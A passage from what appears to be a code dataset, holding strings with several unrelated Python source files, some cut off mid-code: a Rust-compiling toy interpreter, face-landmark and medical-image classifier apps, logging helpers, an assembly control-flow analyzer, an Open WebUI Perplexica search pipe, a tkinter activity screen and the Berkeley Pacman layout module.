variable\n\n\n\n# %% ===================================================================== #\n#                            KEYWORDS IN PYTHON                            #\n# ======================================================================== #\n# Printing all keywords at once using \"kwlist()\"\nfor word in keyword.kwlist:\n    print(word)\n\n# - Most of the IDEs color the keywords distinctly. Above keywords can be categorized as follows: \n\n# |---------------------  |-----------------------------------------------|\n# |Category               |Keywords                                       |\n# |---------------------  |-----------------------------------------------|\n# |Value Keywords         |True, False, None                              |\n# |Operator Keywords      |and, or, not, in, is                      ",
    "import argparse\nimport os\n\nparser = argparse.ArgumentParser(description=\"RustScript Interpreter\")\n\nparser.add_argument('-e', '--execute', type=str, help='Execute a RustScript program.')\nparser.add_argument('-v', '--version', action='store_true', help='RustScript version.')\n\nargs = parser.parse_args()\n\nif args.execute:\n\n    libraries = []\n\n    choosefile = args.execute\n\n    if '.rscript' in choosefile:\n\n        with open(choosefile, 'r') as file:\n\n\n            lines = file.readlines()\n\n            read = 0\n\n            for line in lines:\n\n                linetoread = lines[read]\n\n                command = linetoread\n\n                if command.startswith('use'):\n                    libraries.append(command.replace('use ', '').strip())\n\n                else:\n\n                    with open('compile.rs', 'a') as file:\n                        pass\n                    with open('compile.rs', 'w') as file:\n                        pass\n                    with open('compile.rs', 'a') as file:\n                        file.write('#![allow(unused_imports)]\\n')\n                        loop = 0\n                        for item in libraries:\n                            file.write(f'use {libraries[loop]};\\n')\n                            loop += 1\n                        file.write('fn main() {\\n')\n                        file.write(f'    {command};\\n')\n                        file.write('}\\n')\n                    os.system('rustc compile.rs > ' + os.devnull + ' 2>&1')\n                    try:\n                        os.remove('compile.rs')\n                    except:\n                        print('ERROR: Code Execution Failed: CODE ERROR')\n                    os.system('./compile')\n                    os.remove('compile') \n\n                read += 1\n\n\n    else:\n        print('ERROR: Incorrect file type, RustScript files need to be .rscript')\n\nelif args.version:\n\n    print('RustScript v0.0.2')\n\nelse:\n\n    import os\n\n    libraries = []\n\n    print('RustScript v0.0.2')\n\n    while True:\n\n        command = input('>>> ')\n\n        if command.startswith('use'):\n            libraries.append(command.replace('use ', '').strip())\n\n        else:\n            with open('compile.rs', 'a') as file:\n                pass\n            with open('compile.rs', 'w') as file:\n                pass\n            with open('compile.rs', 'a') as file:\n                file.write('fn main() {\\n')\n                file.write(f'    {command}\\n')\n                file.write('}\\n')\n\n            os.system('rustc compile.rs > ' + os.devnull + ' 2>&1')\n\n            try:\n                os.remove('compile.rs')\n            except:\n                print('ERROR: Code Execution Failed: CODE ERROR')\n            os.system('./compile')\n            os.remove('compile')\n",
    "import cv2\r\nimport mediapipe as mp\r\nimport numpy as np\r\nimport math\r\nfrom datetime import datetime\r\n\r\nclass RexzeaCasualFaceDetector:\r\n    def __init__(self):\r\n        self.mp_face_mesh = mp.solutions.face_mesh\r\n        self.mp_drawing = mp.solutions.drawing_utils\r\n        self.mp_drawing_styles = mp.solutions.drawing_styles\r\n        \r\n        self.face_mesh = self.mp_face_mesh.FaceMesh(\r\n            max_num_faces=4,\r\n            refine_landmarks=True,\r\n            min_detection_confidence=0.5,\r\n            min_tracking_confidence=0.5\r\n        )\r\n\r\n        self.LEFT_EYE_INDEXES = [362, 385, 387, 263, 373, 380]\r\n        self.RIGHT_EYE_INDEXES = [33, 160, 158, 133, 153, 144]\r\n        \r\n        self.COLORS = {\r\n            'primary': (255, 200, 0),   \r\n            'secondary': (0, 255, 255),   \r\n            'accent': (0, 165, 255),      \r\n            'warning': (0, 0, 255),       \r\n            'success': (0, 255, 0),       \r\n            'white': (255, 255, 255),     \r\n            'black': (0, 0, 0)            \r\n        }\r\n\r\n        self.FONT = cv2.FONT_HERSHEY_SIMPLEX\r\n        self.FONT_SCALE = 0.6\r\n        self.THICKNESS = 2\r\n\r\n        self.show_mesh = True\r\n        self.show_contours = True\r\n        self.show_metrics = True\r\n\r\n    def draw_fancy_rectangle(self, img, pt1, pt2, color, thickness=1, r=10, d=5):\r\n        x1, y1 = pt1\r\n        x2, y2 = pt2\r\n\r\n        cv2.line(img, (x1 + r, y1), (x2 - r, y1), color, thickness)\r\n        cv2.line(img, (x1 + r, y2), (x2 - r, y2), color, thickness)\r\n        cv2.line(img, (x1, y1 + r), (x1, y2 - r), color, thickness)\r\n        cv2.line(img, (x2, y1 + r), (x2, y2 - r), color, thickness)\r\n        cv2.ellipse(img, (x1 + r, y1 + r), (r, r), 180, 0, 90, color, thickness)\r\n        cv2.ellipse(img, (x2 - r, y1 + r), (r, r), 270, 0, 90, color, thickness)\r\n        cv2.ellipse(img, (x1 + r, y2 - r), (r, r), 90, 0, 90, color, thickness)\r\n        cv2.ellipse(img, (x2 - r, y2 - r), (r, r), 0, 0, 90, color, thickness)\r\n\r\n    def draw_metrics_panel(self, frame, metrics):\r\n        height, width = frame.shape[:2]\r\n        panel_width = 250\r\n        panel_height = 150\r\n\r\n        overlay = frame.copy()\r\n        cv2.rectangle(overlay, (10, 10), (panel_width, panel_height), \r\n                     self.COLORS['black'], -1)\r\n        cv2.addWeighted(overlay, 0.7, frame, 0.3, 0, frame)\r\n        \r\n        self.draw_fancy_rectangle(frame, (10, 10), (panel_width, panel_height), \r\n                                self.COLORS['primary'], 2)\r\n\r\n        cv2.putText(frame, \"Face Analysis Metrics\", (20, 35),\r\n                    self.FONT, self.FONT_SCALE, self.COLORS['primary'], \r\n                    self.THICKNESS)\r\n        \r\n        y_offset = 60\r\n        for label, value in metrics.items():\r\n            cv2.putText(frame, f\"{label}: {value}\", (20, y_offset),\r\n                       self.FONT, self.FONT_SCALE, self.COLORS['white'], 1)\r\n            y_offset += 25\r\n            \r\n\r\n    def draw_status_indicator(self, frame, text, position, is_active):\r\n        color = self.COLORS['success'] if is_active else self.COLORS['warning']\r\n\r\n        cv2.circle(frame, position, 8, color, -1)\r\n\r\n        cv2.putText(frame, text, (position[0] + 15, position[1] + 5),\r\n                    self.FONT, self.FONT_SCALE, color, 1)\r\n\r\n    def calculate_eye_aspect_ratio(self, landmarks, eye_indexes):\r\n        points = []\r\n        for index in eye_indexes:\r\n            point = landmarks.landmark[index]\r\n            points.append([point.x, point.y])\r\n        \r\n        points = np.array(points)\r\n        vertical_dist1 = np.linalg.norm(points[1] - points[5])\r\n        vertical_dist2 = np.linalg.norm(points[2] - points[4])\r\n        horizontal_dist = np.linalg.norm(points[0] - points[3])\r\n        \r\n        ear = (vertical_dist1 + vertical_dist2) / (2.0 * horizontal_dist)\r\n        return ear\r\n\r\n    def detect_mouth_open(self, landmarks):\r\n        upper_lip = landmarks.landmark[13]\r\n        lower_lip = landmarks.landmark[14]\r\n        \r\n        distance = math.sqrt(\r\n            (upper_lip.x - lower_lip.x)**2 + \r\n            (upper_lip.y - lower_lip.y)**2\r\n        )\r\n        return distance > 0.02\r\n\r\n    def process_frame(self, frame):\r\n        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\r\n        results = self.face_mesh.process(frame_rgb)\r\n        \r\n        if results.multi_face_landmarks:\r\n            for face_landmarks in results.multi_face_landmarks:\r\n                if self.show_mesh:\r\n                    self.mp_drawing.draw_landmarks(\r\n                        image=frame,\r\n                        landmark_list=face_landmarks,\r\n                        connections=self.mp_face_mesh.FACEMESH_TESSELATION,\r\n                        landmark_drawing_spec=None,\r\n                        connection_drawing_spec=self.mp_drawing_styles.get_default_face_mesh_tesselation_style()\r\n                    )\r\n                \r\n                if self.show_contours:\r\n                    self.mp_drawing.draw_landmarks(\r\n                        ",
    "import tkinter as tk\nfrom tkinter import filedialog, ttk, messagebox\nfrom PIL import Image, ImageTk\nimport torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import Dataset, DataLoader\nfrom torchvision import transforms, models\nimport os\nimport json\nimport numpy as np\n\nclass BodyPartDataset(Dataset):\n    \"\"\"Dataset for medical body part images\"\"\"\n    def __init__(self, image_paths, labels, transform=None, is_training=True):\n        self.image_paths = image_paths\n        self.labels = labels\n        self.transform = transform\n        self.is_training = is_training\n\n    def __len__(self):\n        return len(self.image_paths)\n\n    def __getitem__(self, idx):\n        try:\n            image = Image.open(self.image_paths[idx]).convert('L')\n        except Exception as e:\n            print(f\"Failed to load image: {str(e)}\")\n            image = Image.new('L', (224, 224), 0)  # Return blank image if loading fails\n            \n        if self.transform:\n            image = self.transform(image)\n        return image, self.labels[idx]\n\n\n\nclass BodyPartIdentificationApp:\n    def __init__(self, master):\n        self.master = master\n        self.master.title(\"Medical Image Identification\")\n        self.master.geometry(\"800x800\")\n\n        # Define the specific body parts we want to identify\n        self.body_parts = ['brain', 'lungs', 'knee', 'hand']\n        self.part_to_idx = {part: idx for idx, part in enumerate(self.body_parts)}\n        \n        # Training data storage\n        self.training_data = {part: [] for part in self.body_parts}\n        \n        # Initialize training metrics\n        self.training_accuracy = []\n        \n        # Model file path\n        self.model_path = 'medicallll_model.pth'\n        \n        # Set device\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        \n        # Initialize transforms\n        self.transform = self.get_preprocessing()\n        self.train_transform = self.get_training_transforms()\n        \n        # Initialize or load model\n        self.initialize_model()\n        \n        self.create_widgets()\n        self.load_training_data()\n\n    def get_preprocessing(self):\n        \"\"\"Returns the preprocessing pipeline for inference\"\"\"\n        return transforms.Compose([\n            transforms.Resize((224, 224)),\n            transforms.ToTensor(),\n            transforms.Normalize(mean=[0.456], std=[0.224]),\n            transforms.Lambda(lambda x: torch.clamp(x * 1.2, 0, 1))\n        ])\n\n    def get_training_transforms(self):\n        \"\"\"Returns the preprocessing pipeline with augmentations for training\"\"\"\n        return transforms.Compose([\n            transforms.Resize((224, 224)),\n            transforms.RandomAffine(\n                degrees=15,\n                translate=(0.1, 0.1),\n                scale=(0.9, 1.1),\n                fill=0\n            ),\n            transforms.RandomHorizontalFlip(),\n            transforms.ToTensor(),\n            transforms.Normalize(mean=[0.456], std=[0.224]),\n            transforms.RandomAdjustSharpness(sharpness_factor=1.5, p=0.3)\n        ])\n\n    def initialize_model(self):\n        self.model = models.resnet18(pretrained=True)\n        \n        # Modify first layer for single-channel input\n        self.model.conv1 = nn.Conv2d(1, 64, kernel_size=(7, 7), \n                                   stride=(2, 2), padding=(3, 3), bias=False)\n        \n        # Enhanced final classifier\n        num_ftrs = self.model.fc.in_features\n        self.model.fc = nn.Sequential(\n            nn.Linear(num_ftrs, 512),\n            nn.BatchNorm1d(512),\n            nn.ReLU(), #allowing it to learn complex relationships in the data\n            nn.Dropout(0.3), #This helps prevent overfitting by reducing reliance on specific neurons\n            nn.Linear(512, 256),\n            nn.BatchNorm1d(256),\n            nn.ReLU(),\n            nn.Dropout(0.2),\n            nn.Linear(256, len(self.body_parts))\n        )\n        \n        if os.path.exists(self.model_path):\n            try:\n                self.model.load_state_dict(torch.load(self.model_path))\n                print(\"Loaded existing model\")\n            except Exception as e:\n                print(f\"Error loading model: {e}\")\n                self.initialize_new_model()\n        else:\n            self.initialize_new_model()\n        \n        self.model = self.model.to(self.device)\n\n    def initialize_new_model(self):\n        \"\"\"Initialize a new model with frozen layers except final layers\"\"\"\n        for param in self.model.parameters():\n            param.requires_grad = False\n        # Unfreeze the final layers\n        for param in self.model.fc.parameters():\n            param.requires_grad = True\n\n    def create_widgets(self):\n        \"\"\"Create and arrange all GUI widgets\"\"\"\n        # Style configuration\n        style = ttk.Style()\n        style.configure('Header.TLabel', font=('Helvetica', 12, 'bold'))\n        \n        # Create frames\n        self.top_frame = ttk.Frame(self.m",
    "import logging\nimport csv\nimport os\n\ndef setup_logging(log_file='output/train_log.csv'):\n    \"\"\"\n    \u8bbe\u7f6e\u65e5\u5fd7\u8bb0\u5f55\u5668\uff0c\u4fdd\u5b58\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u7684\u7ed3\u679c\u5230 CSV \u6587\u4ef6\n    \"\"\"\n    logging.basicConfig(\n        filename=log_file,\n        level=logging.INFO,\n        format='%(asctime)s - %(levelname)s - %(message)s'\n    )\n\n    # \u5199\u5165\u6807\u9898\n    if not os.path.exists(log_file):\n        with open(log_file, mode='w', newline='') as file:\n            writer = csv.writer(file)\n            writer.writerow(['model', 'epochs', 'batch_size', 'lr', 'train_loss', 'valid_loss', 'final_mse'])\n\ndef save_training_result(model_tag, train_loss=None, valid_loss=None, mse=None, file_path='./output/train_log.csv'):\n    \"\"\"\u4fdd\u5b58\u8bad\u7ec3\u7ed3\u679c\"\"\"\n    with open(file_path, mode='a', newline='') as file:\n        writer = csv.writer(file)\n\n        if model_tag != 'final_mse':\n            writer.writerow([model_tag, '', '', '', train_loss, valid_loss, ''])\n        else:\n            # \u4fdd\u5b58 final_mse\n            writer.writerow([model_tag, '', '', '', '', '', mse])\n\ndef log_info(message):\n    logging.info(message)\n\ndef log_error(message):\n    logging.error(message)\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 11:42:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\nfrom colorama import Fore\r\nimport pyfiglet\r\nimport os\r\nfont=pyfiglet.figlet_format(\"CONTROL FLOW DETECTOR\")\r\nprint(Fore.GREEN+font)\r\n\r\nimport re\r\n\r\ndef parse_assembly(file_path):\r\n    \"\"\"\r\n    Parse the given assembly file to extract instructions and their locations.\r\n    \"\"\"\r\n    try:\r\n        with open(file_path, 'r') as file:\r\n            lines = file.readlines()\r\n\r\n        instructions = []\r\n        labels = []\r\n\r\n        for line in lines:\r\n            line = line.strip()\r\n\r\n            # Detect labels in the assembly (usually ends with a colon, e.g., \"loop_start:\")\r\n            label_match = re.match(r\"^([a-zA-Z_][a-zA-Z0-9_]*)\\s*:$\", line)\r\n            if label_match:\r\n                labels.append(label_match.group(1))\r\n\r\n            # Store instruction with its line number\r\n            instructions.append(line)\r\n\r\n        return instructions, labels\r\n\r\n    except Exception as e:\r\n        print(f\"Error reading file {file_path}: {e}\")\r\n        return [], []\r\n\r\ndef analyze_control_flow(instructions):\r\n    \"\"\"\r\n    Analyze the control flow of the program by identifying key instructions.\r\n    \"\"\"\r\n    control_flow_instructions = {\r\n        \"unconditional_jumps\": [],\r\n        \"conditional_jumps\": [],\r\n        \"function_calls\": [],\r\n        \"function_returns\": [],\r\n        \"loops\": []\r\n    }\r\n\r\n    # Regular expressions for detecting control flow instructions\r\n    unconditional_jump_pattern = re.compile(r\"^\\s*jmp\\b\", re.IGNORECASE)\r\n    conditional_jump_pattern = re.compile(r\"^\\s*j(e|ne|g|l|ge|le|b|a|ae|be|c|z|nz)\\b\", re.IGNORECASE)\r\n    function_call_pattern = re.compile(r\"^\\s*call\\b\", re.IGNORECASE)\r\n    function_return_pattern = re.compile(r\"^\\s*ret\\b\", re.IGNORECASE)\r\n    \r\n    # Detect control flow instructions in the assembly code\r\n    for line_number, line in enumerate(instructions, 1):\r\n        if unconditional_jump_pattern.match(line):\r\n            control_flow_instructions[\"unconditional_jumps\"].append((line_number, line))\r\n        elif conditional_jump_pattern.match(line):\r\n            control_flow_instructions[\"conditional_jumps\"].append((line_number, line))\r\n        elif function_call_pattern.match(line):\r\n            control_flow_instructions[\"function_calls\"].append((line_number, line))\r\n        elif function_return_pattern.match(line):\r\n            control_flow_instructions[\"function_returns\"].append((line_number, line))\r\n\r\n    # Identify loops (typically characterized by labels and jumps)\r\n    for line_number, line in enumerate(instructions, 1):\r\n        if unconditional_jump_pattern.match(line) or conditional_jump_pattern.match(line):\r\n            # Check if there is a corresponding label that indicates a loop (heuristic approach)\r\n            for label in labels:\r\n                if label in line:\r\n                    control_flow_instructions[\"loops\"].append((line_number, line, label))\r\n\r\n    return control_flow_instructions\r\n\r\ndef print_control_flow_report(control_flow_instructions):\r\n    \"\"\"\r\n    Print the control flow report with detected instructions.\r\n    \"\"\"\r\n    print(\"\\nControl Flow Analysis Report:\")\r\n\r\n    # Unconditional jumps\r\n    print(\"\\nUnconditional Jumps:\")\r\n    for line_number, instruction in control_flow_instructions[\"unconditional_jumps\"]:\r\n        print(f\"Line {line_number}: {instruction}\")\r\n\r\n    # Conditional jumps\r\n    print(\"\\nConditional Jumps:\")\r\n    for line_number, instruction in control_flow_instructions[\"conditional_jumps\"]:\r\n        print(f\"Line {line_number}: {instruction}\")\r\n\r\n    # Function calls\r\n    print(\"\\nFunction Calls:\")\r\n    for line_number, instruction in control_flow_instructions[\"function_calls\"]:\r\n        print(f\"Line {line_number}: {instruction}\")\r\n\r\n    # Function returns\r\n    print(\"\\nFunction Returns:\")\r\n    for line_number, instruction in control_flow_instructions[\"function_returns\"]:\r\n        print(f\"Line {line_number}: {instruction}\")\r\n\r\n    # Loops\r\n    print(\"\\nLoops (Jumps with associated labels):\")\r\n    for line_number, instruction, label in control_flow_instructions[\"loops\"]:\r\n        print(f\"Line {line_number}: {instruction} (Looping to label {label})\")\r\n\r\ndef main():\r\n    # Ask the user for the assembly file path\r\n    file_path = input(\"Enter the path of the assembly file:\").strip()\r\n\r\n    # Parse the assembly file to extract instructions and labels\r\n    instructions, labels = parse_assembly(file_path)\r\n\r\n    if not instructions:\r\n        print(\"Failed to parse the assembly file.\")\r\n        return\r\n\r\n    # Analyze the control flow of the program\r\n    control_flow_instructions = analyze_control_flow(instructions)\r\n\r\n    # Print the control flow analysis report\r\n    print_control_flow_report(control_flow_instructions)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "\"\"\"\ntitle: perplexica pipe\nauthor: open-webui, gwaanl\nauthor_url\uff1ahttps://github.com/ViffyGwaanl/perplexica-pipe\nYou can find the instructions and submit questions at the website above\nfunding_url: https://github.com/ViffyGwaanl\nversion: 0.3.5\nrequired_open_webui_version: 0.5.3\n\n0.1.1\uff1aCreate code to implement the \"pipeline\" function using the Perplexica search API\n0.2.1\uff1aIncreased contextual memory function, which can record historical conversation data\u00a0\nand send the history to the Perplexica API for more accurate searches each time a search is performed.\n0.2.2\uff1aChange the model display name to the following format \"Perplexica/gpt-4o/academicSearch\"\n0.3.1\uff1aAdded the option to select a local model, which can be configured to use OpenAI or Ollama in perplexica_provider\n0.3.2\uff1aConfigure the provider for embeddingModel and chatModel separately\n0.3.3: Added customOpenAIKey and customOpenAIBaseURL for custom OpenAI instances\n0.3.4: Fixed the issue that caused openwebui to fail to start when the values of customOpenAIBaseURL and customOpenAIKey were none,\nIf you installed 0.3.3 and it caused openwebui to fail to start, please find the solution at author_url.\n0.3.5: Optimized the default values and the cleared content of the request body\n\"\"\"\n\nfrom typing import List, Union\nfrom pydantic import BaseModel, Field\nimport requests\n\n\nclass Pipe:\n    class Valves(BaseModel):\n        # Perplexica API configuration\n        enable_perplexica: bool = Field(\n            default=True\n        )  # Enable Perplexica search (default: True)\n        perplexica_api_url: str = Field(\n            default=\"http://localhost:3001/api/search\"\n        )  # Perplexica API URL\n        perplexica_chat_provider: str = Field(\n            default=\"openai\"\n        )  # Provider for chat model\n        perplexica_chat_model: str = Field(\n            default=\"gpt-4o-mini\"\n        )  # Chat model to use (default: gpt-4o-mini)\n        perplexica_embedding_provider: str = Field(\n            default=\"openai\"\n        )  # Provider for embedding model\n        perplexica_embedding_model: str = Field(\n            default=\"text-embedding-3-large\"\n        )  # Embedding model to use (default: text-embedding-3-large)\n        perplexica_focus_mode: str = Field(\n            default=\"webSearch\"\n        )  # Focus mode for search (default: webSearch)\n        perplexica_optimization_mode: str = Field(\n            default=\"balanced\"\n        )  # Optimization mode for search (default: balanced)\n        # Custom OpenAI configuration\n        customOpenAIBaseURL: str = Field(\n            default=\"default\"\n        )  # Base URL for custom OpenAI instance\n        customOpenAIKey: str = Field(\n            default=\"default\"\n        )  # API key for custom OpenAI instance\n\n    def __init__(self):\n        self.type = \"manifold\"  # Pipe type\n        self.id = \"perplexica_pipe\"  # Pipe ID\n        self.name = \"Perplexica/\"  # Pipe name\n        self.valves = self.Valves()  # Initialize Valves instance\n        self.history = []  # Initialize history list for storing conversation history\n\n    def pipes(self) -> List[dict]:\n        \"\"\"Return a list of enabled pipes.\"\"\"\n        enabled_pipes = []\n        if self.valves.enable_perplexica:\n            enabled_pipes.append(\n                {\n                    \"id\": \"perplexica\",\n                    \"name\": f\"{self.valves.perplexica_chat_model}/{self.valves.perplexica_focus_mode}\",\n                }\n            )\n        return enabled_pipes\n\n    def pipe(self, body: dict, results=None) -> Union[str, dict]:\n        \"\"\"Process the request and return the search results.\"\"\"\n        user_input = self._extract_user_input(\n            body\n        )  # Extract user input from the request body\n        if not user_input:\n            return \"No search query provided\"  # Return an error message if no user input is provided\n\n        model = body.get(\"model\", \"\")  # Get the model name from the request body\n        print(f\"Received model: {model}\")  # Print the received model name\n\n        if \"perplexica\" in model.lower() and self.valves.enable_perplexica:\n            print(\"Calling Perplexica search\")\n            response = self._search_perplexica(\n                user_input, results\n            )  # Get search results\n            self._update_history(user_input, response)  # Update conversation history\n            return response  # Return the search results\n        else:\n            return f\"Unsupported or disabled search engine for model: {model}\"  # Return an error message if the search engine is not supported or disabled\n\n    def _update_history(self, user_input: str, response: str):\n        \"\"\"Update the conversation history.\"\"\"\n        self.history.append([\"human\", user_input])  # Add user input to history\n        self.history.append([\"assistant\", response])  # Add search results to history\n\n    def _extract_user_input(self, body: dict) -> str:\n        \"\"\"Extract user input from the request body.\"\"\"\n        messages = body.get(\n            \"messa",
    "import tkinter as tk\nimport customtkinter as ctk  \nfrom PIL import Image, ImageTk\nfrom tkinter import messagebox, simpledialog\nfrom database import create_connection\nimport tensorflow as tf\n\n\n# Colores de la paleta de IFSUL\nIFSUL_GREEN = \"#006400\"\nIFSUL_LIGHT_GREEN = \"#00A36C\"\nIFSUL_WHITE = \"#FFFFFF\" #o F4F4F4\nIFSUL_DARK_GREY = \"#2F4F4F\"\nIFSUL_BLACK = \"#000000\"\nIFSUL_HOVER = \"#04ca88\"\nIFSUL_GREY = \"#EDEDED\"\n# Tama\u00f1o de fuente global\nFONT_MAX = (\"Helvetica\", 19)\nFONT_LARGE = (\"Helvetica\", 16)\nFONT_MEDIUM = (\"Helvetica\", 14)\nFONT_SMALL = (\"Helvetica\", 12)\n\n\nclass ActivityScreen(tk.Frame):\n    def __init__(self, master):\n        super().__init__(master, bg=IFSUL_WHITE)\n\n        self.master = master\n        \n\n\n        self.create_widgets()\n        \n        # Cargar actividades al inicio\n        self.load_activities()\n\n\n\n        # Vincular el evento de cierre de la ventana al m\u00e9todo on_close\n        self.master.protocol(\"WM_DELETE_WINDOW\", self.on_close)\n\n    def create_widgets(self):\n        top_banner_frame = tk.Frame(self, bg=IFSUL_DARK_GREY, height=50, pady=10, padx=35)\n        top_banner_frame.pack(side=\"top\", fill=\"x\")\n\n        # Frame para la etiqueta del nombre del administrador, alineada a la derecha\n        admin_frame = tk.Frame(top_banner_frame, bg=IFSUL_DARK_GREY)\n        admin_frame.pack(side=\"top\", anchor=\"ne\", padx=10, pady=5)  # Colocado en la parte superior derecha\n\n        # Etiqueta del nombre del administrador\n        admin_label = tk.Label(admin_frame, text=f\"Administrador: {self.master.admin_name}\", bg=IFSUL_DARK_GREY, fg=IFSUL_WHITE, font=(\"Helvetica\", 15, \"bold\"))\n        admin_label.pack()\n\n\n        # Cargar la imagen para el bot\u00f3n de \"Retroceder\"\n        izquierda_image = ctk.CTkImage(Image.open(\"Resources/izquierda3.png\"), size=(35, 35))\n\n        ctk.CTkButton(top_banner_frame,text=\"\", image=izquierda_image, command=self.go_back,fg_color=IFSUL_GREEN, text_color=IFSUL_WHITE, font=FONT_LARGE,hover_color=IFSUL_HOVER, width=10, height=40, corner_radius=10).pack(side=\"left\", padx=10)\n\n\n       \n        main_frame = tk.Frame(self, bg=IFSUL_WHITE)\n        main_frame.pack(pady=(0, 0), padx=10, expand=True, fill=\"both\")  # Ajustar pady aqu\u00ed para reducir el espacio\n\n        # Frame para el registro de actividad\n        self.register_frame = tk.Frame(main_frame, bg=IFSUL_WHITE)\n        self.register_frame.pack(side=\"top\", padx=10, pady=30)  # Reducir el pady inferior a 0\n\n        activities_label = tk.Label(self.register_frame, text=\"Registrar Actividad\", bg=IFSUL_WHITE, fg=IFSUL_GREEN, font=(\"Helvetica\", 20, \"bold\"))\n        activities_label.pack(pady=(10, 5))\n\n        self.activity_entry = tk.Entry(self.register_frame, font=FONT_MEDIUM, width=30)\n        self.activity_entry.pack(pady=(0, 5))\n\n        create_button = ctk.CTkButton(self.register_frame, text=\"Registrar\", command=self.create_activity, fg_color=IFSUL_GREEN, text_color=IFSUL_WHITE, font=FONT_LARGE,hover_color=IFSUL_HOVER, height=40, corner_radius=10)\n        create_button.pack()\n\n        # Frame gris para la lista de actividades, ubicado debajo del frame de registro\n        self.activities_frame = tk.Frame(main_frame, bg=IFSUL_GREY)\n        self.activities_frame.pack(side=\"top\", fill=\"y\", expand=True, pady=(0, 10))  # Ajustar el pady aqu\u00ed\n\n        self.activities_frame.pack_propagate(False)\n        self.activities_frame.config(width=470)\n\n        self.activities_label = tk.Label(self.activities_frame, text=\"Listado de Actividades\", bg=IFSUL_GREY, fg=IFSUL_GREEN, font=(\"Helvetica\", 20, \"bold\"))\n        self.activities_label.pack(pady=(5, 5))  # Mantener o ajustar el pady seg\u00fan sea necesario\n\n        self.frame = tk.Frame(main_frame, bg=IFSUL_WHITE)\n        self.frame.pack(side=\"top\", fill=\"y\")  # Ajustar el pady aqu\u00ed\n\n        self.no_activity_label = tk.Label(self.frame, text=\"No hay actividades registradas.\", bg=IFSUL_WHITE, fg=\"red\", font=FONT_MEDIUM)\n        self.no_activity_label.pack_forget()\n\n        self.canvas = tk.Canvas(self.activities_frame, bg=IFSUL_GREY)\n        self.canvas.pack(side=\"left\", fill=\"both\", expand=True)\n\n        \n\n        self.scrollbar = tk.Scrollbar(self.activities_frame, command=self.canvas.yview)\n        self.scrollbar.pack(side=\"right\", fill=\"y\")\n\n        self.scrollable_container = tk.Frame(self.canvas, bg=IFSUL_GREY, padx=10)\n        self.scrollable_container.bind(\"<Configure>\", self.on_frame_configure)\n        self.canvas.create_window((0, 0), window=self.scrollable_container, anchor=\"nw\")\n\n        self.scrollable_frame = tk.Frame(self.scrollable_container, bg=IFSUL_GREY)\n        self.scrollable_frame.pack(fill=\"both\", expand=True)\n\n        self.canvas.configure(yscrollcommand=self.scrollbar.set)\n        self.canvas.bind_all(\"<MouseWheel>\", self.on_mouse_wheel)\n\n    \n\n\n\n\n\n\n    def load_activities(self):\n\n\n        # Limpiar el frame de actividades antes de cargar nuevas actividades\n        for widget in self.scrollable_frame.winfo_children():\n            widget.destroy()\n\n        connection = create_c",
    "# layout.py\n# ---------\n# Licensing Information:  You are free to use or extend these projects for\n# educational purposes provided that (1) you do not distribute or publish\n# solutions, (2) you retain this notice, and (3) you provide clear\n# attribution to UC Berkeley, including a link to http://ai.berkeley.edu.\n# \n# Attribution Information: The Pacman AI projects were developed at UC Berkeley.\n# The core projects and autograders were primarily created by John DeNero\n# (denero@cs.berkeley.edu) and Dan Klein (klein@cs.berkeley.edu).\n# Student side autograding was added by Brad Miller, Nick Hay, and\n# Pieter Abbeel (pabbeel@cs.berkeley.edu).\n\n\nfrom util import manhattanDistance\nfrom game import Grid\nimport os\nimport random\n\nVISIBILITY_MATRIX_CACHE = {}\n\nclass Layout:\n    \"\"\"\n    A Layout manages the static information about the game board.\n    \"\"\"\n\n    def __init__(self, layoutText):\n        self.width = len(layoutText[0])\n        self.height= len(layoutText)\n        self.walls = Grid(self.width, self.height, False)\n        self.food = Grid(self.width, self.height, False)\n        self.capsules = []\n        self.agentPositions = []\n        self.numGhosts = 0\n        self.processLayoutText(layoutText)\n        self.layoutText = layoutText\n        self.totalFood = len(self.food.asList())\n        # self.initializeVisibilityMatrix()\n\n    def getNumGhosts(self):\n        return self.numGhosts\n\n    def initializeVisibilityMatrix(self):\n        global VISIBILITY_MATRIX_CACHE\n        if reduce(str.__add__, self.layoutText) not in VISIBILITY_MATRIX_CACHE:\n            from game import Directions\n            vecs = [(-0.5,0), (0.5,0),(0,-0.5),(0,0.5)]\n            dirs = [Directions.NORTH, Directions.SOUTH, Directions.WEST, Directions.EAST]\n            vis = Grid(self.width, self.height, {Directions.NORTH:set(), Directions.SOUTH:set(), Directions.EAST:set(), Directions.WEST:set(), Directions.STOP:set()})\n            for x in range(self.width):\n                for y in range(self.height):\n                    if self.walls[x][y] == False:\n                        for vec, direction in zip(vecs, dirs):\n                            dx, dy = vec\n                            nextx, nexty = x + dx, y + dy\n                            while (nextx + nexty) != int(nextx) + int(nexty) or not self.walls[int(nextx)][int(nexty)] :\n                                vis[x][y][direction].add((nextx, nexty))\n                                nextx, nexty = x + dx, y + dy\n            self.visibility = vis\n            VISIBILITY_MATRIX_CACHE[reduce(str.__add__, self.layoutText)] = vis\n        else:\n            self.visibility = VISIBILITY_MATRIX_CACHE[reduce(str.__add__, self.layoutText)]\n\n    def isWall(self, pos):\n        x, col = pos\n        return self.walls[x][col]\n\n    def getRandomLegalPosition(self):\n        x = random.choice(range(self.width))\n        y = random.choice(range(self.height))\n        while self.isWall( (x, y) ):\n            x = random.choice(range(self.width))\n            y = random.choice(range(self.height))\n        return (x,y)\n\n    def getRandomCorner(self):\n        poses = [(1,1), (1, self.height - 2), (self.width - 2, 1), (self.width - 2, self.height - 2)]\n        return random.choice(poses)\n\n    def getFurthestCorner(self, pacPos):\n        poses = [(1,1), (1, self.height - 2), (self.width - 2, 1), (self.width - 2, self.height - 2)]\n        dist, pos = max([(manhattanDistance(p, pacPos), p) for p in poses])\n        return pos\n\n    def isVisibleFrom(self, ghostPos, pacPos, pacDirection):\n        row, col = [int(x) for x in pacPos]\n        return ghostPos in self.visibility[row][col][pacDirection]\n\n    def __str__(self):\n        return \"\\n\".join(self.layoutText)\n\n    def deepCopy(self):\n        return Layout(self.layoutText[:])\n\n    def processLayoutText(self, layoutText):\n        \"\"\"\n        Coordinates are flipped from the 